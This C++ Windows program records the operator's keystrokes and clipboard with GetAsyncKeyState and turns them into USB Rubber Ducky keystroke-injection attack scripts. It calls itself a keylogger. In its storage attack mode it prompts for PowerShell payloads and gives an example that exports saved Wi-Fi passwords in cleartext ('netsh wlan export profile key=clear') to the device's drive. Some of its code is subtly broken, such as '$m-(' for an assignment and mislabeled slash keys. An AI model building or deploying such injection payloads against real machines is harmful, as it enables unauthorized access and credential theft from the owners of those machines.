#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <limits>
#include <vector>
//#include <algorithm>

using std::cout; using std::fstream; using std::string; using std::cin; using std::ios;
using std::endl; using std::vector;

//declare functions
void CheckKeys(string file, bool &bisString, int &isString, int &isComment, int &attackMode);
void FormatString(string file, unsigned char key, bool shift, bool ctrl);
void ChangeMode(string file, unsigned char key, bool &bisString, int &isString, int &isComment);
void InitialDelay(string file);
void SpecialKeys(string file, unsigned char key, int &counter);
bool ChangeAttackMode(string file, unsigned char &key, int &attackMode);
bool PasteText(string file, unsigned char key, bool ctrl);
void CleanPayload(string file);
void AddDelay(string file, unsigned char key);

//global variables

int main() {
    fstream fout;
    //declare variables
    bool bisString = false;
    int isString = 0;
    int isComment = 0;
    int attackMode = 0;

    string fileNumber;
    cout << "Warning ⚠️: Working on adding backspaces and delete action so be careful when making inputs" << endl << endl;
    cout << "File will be saved to payload[number].txt" << endl;
    cout << "Enter file number: ";
    cin >> fileNumber;
    string file = "payload" + fileNumber + ".dd";
    //delete old file
    string deleteOld = "del " + file;
    
    system(deleteOld.c_str());
    cout << "Deleting old file . . ." << endl;
    Sleep(150);

    cout << endl << "- - - KEY FUNCTIONS - - -" << endl << endl;
    cout << "F2: Start/Stop String" << endl << endl 
         << "F4: Start/Stop Comment" << endl << endl
         << "F8: Manual Delay (1500ms)" << endl << endl 
         << "F9: Change Attack Mode (HID/STORAGE)"  << endl << endl;
    Sleep(50);
    //call main function
    cout << "Keylogger started, will be saved to " << file << endl;
    cout << ". . . X_X Press ALT+ESCAPE to exit X_X . . ." << endl << endl;
    CheckKeys(file, bisString, isString, isComment, attackMode);

    cout << endl << endl << "^o^ Cleaning up file ^o^" << endl;
    //call function to remove last line in payload.txt
    CleanPayload(file);

    //program finished
    cout << endl << "\nLogger finished, keystrokes saved in " << file << " in Rubber DUCKY format ^_~" << endl;
}
// main loop which checks if any key is pressed 
void CheckKeys(string file, bool &bisString, int &isString, int &isComment, int &attackMode) {
    //open file
    fstream fout;
    fout.open(file.c_str(), ios::app);
    if(!fout) {
        cout << "Error opening file" << endl;
    }

    //declare variables
    bool isPressed = false;
    bool keyState[256] = {false};
    bool bAttackMode = true;
    unsigned char key;
    int counter = 0;
    string keydelay = "DELAY 300";

    //initial delay of 3 seconds
    InitialDelay(file);

    while(true)
    {
        Sleep(150); //sleep for 100ms to prevent high CPU usage
        for(key = 8; key <= 255; key++)
        {
            isPressed = (GetAsyncKeyState(key) & 0x8000);

            if(isPressed && !keyState[key])
            {
                keyState[key] = true;
                
                //cout << endl << isString << endl;
                bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
                bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
                
                //cin.ignore(numeric_limits<streamsize>::max(), '\n'); // Clear input buffer
                ChangeMode(file, key, bisString, isString, isComment);
                //bAttackMode = ChangeAttackMode(file, key, attackMode);
                AddDelay(file, key);
                if(!ChangeAttackMode(file, key, attackMode))
                {
                    break;
                }


                if(!bisString)
                {
                    //main keys (when these 4 keys are released it will create a new line)
                    if(ctrl && key == 0x11)
                    {
                        fout << "CTRL ";
                        cout << "CTRL ";
                        counter = 0; //reset ctrl
                    }
                    if(shift && key == 0x10)
                    {
                        fout << "SHIFT ";
                        cout << "SHIFT ";
                        counter = 0;
                    }
                    if(alt && key == 0x12)
                    {
                        fout << "ALT ";
                        cout << "ALT ";
                        counter = 0;
                    }
                    if(key == VK_LWIN)
                    {
                        fout << "GUI ";
                        cout << "GUI ";
                        counter = 0;
                    }
                    //if statements to check all special keys
                    SpecialKeys(file, key, counter);

                    if(key >= 0x30 && key <= 0x39)
                    {
                        fout << key << " ";
                        cout << key << " ";
                    }
                    else if (key >= 0x41 && key <= 0x5A)
                    {
                            fout << char(key) << " ";
                            cout << char(key) << " ";       
                    }
                }
                else //call format string function
                {
                    FormatString(file, key, shift, ctrl);
                }
                //exit program if ALT+ESC is pressed
                if(key == 0x1B && GetAsyncKeyState(VK_MENU) & 0x8000){
                    fout.close();
                    return;
                }
            }
            
            if(!isPressed && keyState[key]){
                keyState[key] = false;
                if(key > 159 && key < 224 || key == VK_LWIN || key == VK_RETURN || key == VK_SPACE || key == VK_TAB || key == VK_BACK || key == VK_ESCAPE || key == VK_UP || key == VK_DOWN || key == VK_LEFT || key == VK_RIGHT){
                    // cout << " - - - released";
                    if(counter == 0 && !bisString){
                    cout << endl;
                    fout << endl;
                    cout << keydelay << endl;
                    fout << keydelay << endl;
                    counter++;
                    }
                }
            } 
        }
    }
    return;
}
// begins/ends when ALT + 1 is pressed
void FormatString(string file, unsigned char key, bool shift, bool ctrl){
    //declare variables
    string stringdelay = "DELAY 900";

    //open file
    fstream fout;
    fout.open(file.c_str(), ios::app); //ios::app used to append to file
    if(!fout) {
        cout << endl << "Error opening file" << endl;
        return;
    }

    if(PasteText(file, key, ctrl))
    {
        return;
    }
    if(!shift)
    {
        switch(key) 
        {
            //windows control keys
            case VK_BACK: fout << "\b"; cout << "\b"; break;
            case VK_TAB: fout << "\t"; cout << "\t"; break;
            case VK_RETURN: fout << endl << stringdelay << endl << "ENTER" << endl
                                << stringdelay << endl << "STRING ";
                            cout << endl << stringdelay << endl << "ENTER" << endl
                                 << stringdelay << endl << "STRING "; break;
            //special characters
            case 0xBC: fout << ","; cout << ","; break;
            case VK_OEM_PERIOD: fout << "."; cout << "."; break;
            case VK_OEM_1: fout << ";"; cout << ";"; break;
            case VK_OEM_2: fout << "/"; cout << ";"; break;                        
            case VK_OEM_3: fout << "`"; cout << "`"; break; //top left corner of keyboard
            case VK_OEM_4: fout << "["; cout << "["; break;
            case VK_OEM_6: fout << "]"; cout << "]"; break;
            case VK_OEM_5: fout << "\\"; cout << "\\"; break;
            case VK_OEM_7: fout << "'"; cout << "'"; break;
            case VK_SPACE: fout << " "; cout << " "; break;
            
            //F 1-12 keys and numpad keys`
            case VK_NUMPAD0: fout << "0"; cout << "0"; break;
            case VK_NUMPAD1: fout << "1"; cout << "1"; break;
            case VK_NUMPAD2: fout << "2"; cout << "2"; break;
            case VK_NUMPAD3: fout << "3"; cout << "3"; break;
            case VK_NUMPAD4: fout << "4"; cout << "4"; break;
            case VK_NUMPAD5: fout << "5"; cout << "5"; break;
            case VK_NUMPAD6: fout << "6"; cout << "6"; break;
            case VK_NUMPAD7: fout << "7"; cout << "7"; break;
            case VK_NUMPAD8: fout << "8"; cout << "8"; break;
            case VK_NUMPAD9: fout << "9"; cout << "9"; break;
            case VK_MULTIPLY: fout << "*"; cout << "*"; break;
            case VK_ADD: fout << "+"; cout << "+"; break;
            case VK_SUBTRACT: fout << "-"; cout << "-"; break;
            case VK_DECIMAL: fout << "."; cout << "."; break;
            case VK_DIVIDE: fout << "/"; cout << "/"; break;     
        }
    }
    else
    {
        switch(key) 
        {
            //windows control keys
            case VK_BACK: fout << "\b"; cout << "\b"; break;
            case VK_TAB: fout << "\t"; cout << "\t"; break;
            case VK_RETURN: fout << "\n" << stringdelay << endl << "STRING ";
                            cout << "\n" << stringdelay << endl << "STRING "; break;
            //special characters
            case 0xBC: fout << "<"; cout << "<"; break;
            case VK_OEM_PERIOD: fout << ">"; cout << ">"; break;
            case VK_OEM_1: fout << ":"; cout << ":"; break;
            case VK_OEM_2: fout << "?"; cout << "?"; break;                        
            case VK_OEM_3: fout << "~"; cout << "~"; break; //top left corner of keyboard
            case VK_OEM_4: fout << "{"; cout << "{"; break;
            case VK_OEM_6: fout << "}"; cout << "}"; break;
            case VK_OEM_5: fout << "|"; cout << "|"; break;
            case VK_OEM_7: fout << "\""; cout << "\""; break;
            case VK_SPACE: fout << " "; cout << " "; break;
            
            //F 1-12 keys and numpad keys`
            case VK_NUMPAD0: fout << ")"; cout << ")"; break;
            case VK_NUMPAD1: fout << "!"; cout << "!"; break;
            case VK_NUMPAD2: fout << "@"; cout << "@"; break;
            case VK_NUMPAD3: fout << "#"; cout << "#"; break;
            case VK_NUMPAD4: fout << "$"; cout << "$"; break;
            case VK_NUMPAD5: fout << "%"; cout << "%"; break;
            case VK_NUMPAD6: fout << "^"; cout << "^"; break;
            case VK_NUMPAD7: fout << "&"; cout << "&"; break;
            case VK_NUMPAD8: fout << "*"; cout << "*"; break;
            case VK_NUMPAD9: fout << "("; cout << "("; break;
            case VK_MULTIPLY: fout << "*"; cout << "*"; break;
            case VK_ADD: fout << "+"; cout << "+"; break;
            case VK_SUBTRACT: fout << "-"; cout << "-"; break;
            case VK_DECIMAL: fout << "."; cout << "."; break;
            case VK_DIVIDE: fout << "/"; cout << "/"; break;     
        }
    }
    if(key >= 0x30 && key <= 0x39)
    {
        cout << key;
        fout << key;
    }
    else if (key >= 0x41 && key <= 0x5A)
    {
        if(shift){
            cout << char(key);
            fout << char(key);
        }
        else{
            cout << char(key+32);
            fout << char(key+32);
        }       
    }
    fout.close();
    return;
}
// change between HID, STRING, and comments
void ChangeMode(string file, unsigned char key, bool &bisString, int &isString, int &isComment){
    fstream fout;
    fout.open(file.c_str(), ios::app); //ios::app used to append to file
    if(!fout) {
        cout << endl << "Error opening file" << endl;
        return;
    }

    string stringdelay = "DELAY 1200";

    if(key == 0x71) //if F2 is pressed a string command starts/ends
    {
        if(isString % 2 == 0){
            //starts a string command in ducky language
            if(isString == 0)
            {
                fout << endl << "$_JITTER_ENABLED = TRUE\n\n";
                cout << endl << "$_JITTER_ENABLED = TRUE\n\n";
                //this is a DUCKY function which sets small delay between typing each char
                // in stringln statement
            }
            bisString = true;
            cout << stringdelay << endl << "STRING ";
            fout << stringdelay << endl << "STRING ";
        }
        else {
            //ends a string command in ducky language
            bisString = false;
            cout << endl;
            cout << "DELAY 600" << endl;
            fout << endl;
            fout << "DELAY 600" << endl;
        }
        isString++;
    }
    if(key == 0x73){ //if F4 is pressed a comment starts/ends
        if(isComment % 2 == 0){
            //starts a comment in ducky language
            bisString = true;
            cout << "REM ";
            fout << "REM ";
        }
        else {
            //ends a comment in ducky language
            bisString = false;
            cout << endl;
            fout << endl;
        }
        isComment++;
    }
    fout.close();
    return;
}
// adds initial delay of 3 seconds
void InitialDelay(string file){
    fstream fout;
    fout.open(file.c_str(), ios::app);
    if(!fout){
        cout << "Error opening file";
        return;
    }

    fout << "DELAY 3000" << endl;
    cout << "DELAY 3000" << endl;
    fout.close();
    return; 
}
// checks all special characters (comma, semicolon, slashes)
void SpecialKeys(string file, unsigned char key, int &counter){
    fstream fout;
    //open file
    fout.open(file.c_str(), ios::app);
    if(!fout){
        cout << endl << "Error opening file" << endl;
        return;
    }
    //check all special keys individually (multiple may be pressed at once)
    if(key == VK_BACK){
        fout << "BACKSPACE ";
        cout << "BACKSPACE ";
    }
    if(key == VK_TAB){
        fout << "TAB ";
        cout << "TAB ";
    }
    if(key == VK_RETURN){
        fout << "ENTER ";
        cout << "ENTER ";
    }
    if(key == VK_CAPITAL){
        fout << "CAPSLOCK ";
        cout << "CAPSLOCK ";
    }
    if(key == VK_ESCAPE){
        fout << "ESCAPE ";
        cout << "ESCAPE ";
    }
    if(key == 0xBC){
        fout << "COMMA ";
        cout << "COMMA ";
    }
    if(key == VK_OEM_PERIOD){
        fout << "PERIOD ";
        cout << "PERIOD ";
    }
    if(key == VK_OEM_1){
        fout << "SEMICOLON ";
        cout << "SEMICOLON ";
    }
    if(key == VK_OEM_2){
        fout << "BACKSLASH ";
        cout << "BACKSLASH ";
    }
    if(key == VK_OEM_3){
        fout << "TILDE ";
        cout << "TILDE ";
    }
    if(key == VK_OEM_4){
        fout << "LEFTBRACKET ";
        cout << "LEFTBRACKET ";
    }
    if(key == VK_OEM_5){
        fout << "FORWARDSLASH ";
        cout << "FORWARDSLASH ";
    }
    if(key == VK_OEM_6){
        fout << "RIGHTBRACKET ";
        cout << "RIGHTBRACKET ";
    }
    if(key == VK_OEM_7){
        fout << "QUOTE ";
        cout << "QUOTE ";
    }
    if(key == VK_SPACE){
        fout << "SPACE ";
        cout << "SPACE ";
    }
    if(key == VK_LEFT){
        fout << "LEFT ";
        cout << "LEFT ";
    }
    if(key == VK_RIGHT){
        fout << "RIGHT ";
        cout << "RIGHT ";
    }
    if(key == VK_UP){
        fout << "UP ";
        cout << "UP ";
    }
    if(key == VK_DOWN){
        fout << "DOWN ";
        cout << "DOWN ";
    }
    if(key == VK_INSERT){
        fout << "INSERT ";
        cout << "INSERT ";
    }
    if(key == VK_HOME){
        fout << "HOME ";
        cout << "HOME ";
    }
    if(key == VK_END){
        fout << "END ";
        cout << "END ";
    }
    if(key == VK_PRIOR){
        fout << "PAGEUP ";
        cout << "PAGEUP ";
    }
    if(key == VK_NEXT){
        fout << "PAGEDOWN ";
        cout << "PAGEDOWN ";
    }

    counter = 0;
    fout.close();
    return;
}
// change attack mode - HID or HID STORAGE
bool ChangeAttackMode(string file, unsigned char &key, int &attackMode){

    fstream fout;
    fout.open(file.c_str(), ios::app);
    if(!fout){
        cout << endl << "Error opening file" << endl;
        return true;
    }

    //F9 to change attack mode of RUBBER DUCKY
    if(key == 0x78){
        if(attackMode % 2 == 0){
            cout << endl << "ATTACKMODE HID\n\n";
            fout << endl << "ATTACKMODE HID\n\n";
            attackMode++;
            return true;
        }
        else {
            string input;
            cout << endl << "ATTACKMODE HID STORAGE" << endl;
            fout << endl << "ATTACKMODE HID STORAGE" << endl;
            cout << "\nREM - - -> Input powershell commands in sequential order seperated by ;<- - -" << endl;
            cout << "REM --- Whatever is output to powershell terminal will be saved to a file on the RUBBER DUCKY ---" << endl << endl;
            cout << "REM ---> EXAMPLES:" << endl << 
                    "REM #1) cd $d; netsh wlan export profile key=clear;" << endl << endl
                 << "REM #2) $env:computername >> $m:\\computer_names.txt" << endl << endl;
            getline(cin, input);
            cout << endl << "STRING powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
                 << input << "\"" << endl << endl;
            fout << endl << "STRING powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
                 << input << "\"" << endl << endl;
            attackMode++;
                 return false;
        }
    }
    fout.close();
    return true;
}
// paste copied text
bool PasteText(string file, unsigned char key, bool ctrl){
    Sleep(100);
    if(key == 0x56 && ctrl){
        fstream fout;
        fout.open(file.c_str(), ios::app);
        if(!fout){
            cout << "Error opening file";
            return false;
        }
        if (!OpenClipboard(NULL)) {
            cout << "Error opening clipboard." << endl;
            fout.close();
            return false;
        }

        HANDLE hClipboardData = GetClipboardData(CF_TEXT);
        if (hClipboardData == NULL) {
            cout << "Error getting clipboard data." << endl;
            CloseClipboard();
            fout.close();
            return false;
        }

        char* pszText = static_cast<char*>(GlobalLock(hClipboardData));
        if (pszText == NULL) {
            cout << "Error locking global memory." << endl;
            CloseClipboard();
            fout.close();
            return false;
        }

        string text(pszText);

        GlobalUnlock(hClipboardData);
        CloseClipboard();

        fout << text;
        cout << text;
        fout.close();
        return true;
        }
    else{
    return false;
    }
}
// cleans any errors made in transcription of keys (last escape character)
void CleanPayload(string file){
    fstream fin;
    fstream fout;
    //declare variables
    vector<string> contents;
    string content;
    int i = 0;

    fin.open(file.c_str());
    if(!fin){
        cout << endl << endl << "Error opening file" << endl;
        return;
    }
    cout << endl << " - - - Testing output - - -" << endl << endl << endl;
    //add current text file to vector for transfer
    while(getline(fin, content)){
        contents.push_back(content);
        Sleep(50);
        i++;
    } 
    fin.close();

    //replace file with contents vector (old file minus last line)
    fout.open(file.c_str(), ios::out | ios::trunc);
    if(!fout){
        cout << "Error opening file" << endl;
        return;
    }
    for(int j = 0; j < contents.size() - 1; j++){
        fout << contents[j] << endl;
        cout << contents[j] << endl;
        Sleep(50);
    }
    fout.close();
    Sleep(3000);
    return;
}

void AddDelay(string file, unsigned char key){
    fstream fout;
    if(key == 0x77){
        fout.open(file.c_str());
        if(!fout){
            cout << "Error opening file" << endl;
            return;
        }
        fout << endl << "DELAY 1500" << endl;
        cout << endl << "DELAY 1500" << endl;
        fout.close();
    }
    return;
}
